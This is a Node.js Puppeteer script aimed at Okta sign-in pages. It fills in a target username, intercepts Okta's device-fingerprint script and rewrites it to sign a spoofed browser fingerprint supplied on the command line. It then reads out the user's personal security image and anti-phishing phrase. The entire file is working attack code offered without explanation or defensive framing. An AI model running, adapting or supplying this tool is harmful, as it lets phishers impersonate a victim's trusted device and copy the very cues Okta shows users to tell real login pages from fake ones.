const puppeteer = require('puppeteer');
const atob = require('atob');
const btoa = require('btoa');


const BROWSERFP = process.argv.slice(2)[1];
const USERNAME = process.argv.slice(2)[0];
const browserURL = 'http://127.0.0.1:9222';


function transform(source) {
  let newSource =  source.replace("getNonceAndSignFingerprint(result)", `getNonceAndSignFingerprint('${BROWSERFP}')`);
  return newSource
}


async function intercept(page, transform) {
  const client = await page.target().createCDPSession();

  const urlPatterns = [
    'https://REPLACEME.okta.com/auth/services/devicefingerprint'
  ]

  await client.send('Network.enable');

  await client.send('Network.setRequestInterception', { 
    patterns: urlPatterns.map(pattern => ({
	    urlPattern: pattern, resourceType: 'Document', interceptionStage: 'HeadersReceived'
    }))
  });


  client.on('Network.requestIntercepted', async ({ interceptionId, request, responseHeaders, resourceType }) => {

    const response = await client.send('Network.getResponseBodyForInterception',{ interceptionId });
    const contentTypeHeader = Object.keys(responseHeaders).find(k => k.toLowerCase() === 'content-type');
    let newBody, contentType = responseHeaders[contentTypeHeader];

    
    const bodyData = response.base64Encoded ? atob(response.body) : response.body;

     
    newBody = transform(bodyData, { parser: 'babel' });
     
    const newHeaders = [
      'Date: ' + (new Date()).toUTCString(),
      'Connection: closed',
      'Content-Length: ' + newBody.length,
      'Content-Type: ' + contentType
    ];

    client.send('Network.continueInterceptedRequest', {
      interceptionId,
      rawResponse: btoa('HTTP/1.1 200 OK' + '\r\n' + newHeaders.join('\r\n') + '\r\n\r\n' + newBody)
    });

  });
  await page.keyboard.press("Tab");
  await page.keyboard.press("Tab");
  await page.waitForFunction('document.getElementsByClassName("auth-beacon-security")[0].style.backgroundImage');
  const img = await page.evaluate('document.getElementsByClassName("auth-beacon-security")[0].style.backgroundImage'); 
  const phr = await page.evaluate('document.getElementsByClassName("accessibility-text")[0].textContent');
  console.log(img.split('"')[1]);
  console.log(phr);  
  await page.close();
  process.exit(0);
}

(async function main(){


const browser = await puppeteer.connect({browserURL});
const page = await browser.newPage();
page.goto("https://REPLACEME.okta.com");
await page.waitForSelector('#okta-signin-username');
await page.$eval('#okta-signin-username', (el, username) => el.value = username, USERNAME);
  
intercept(page, transform, BROWSERFP);
}())
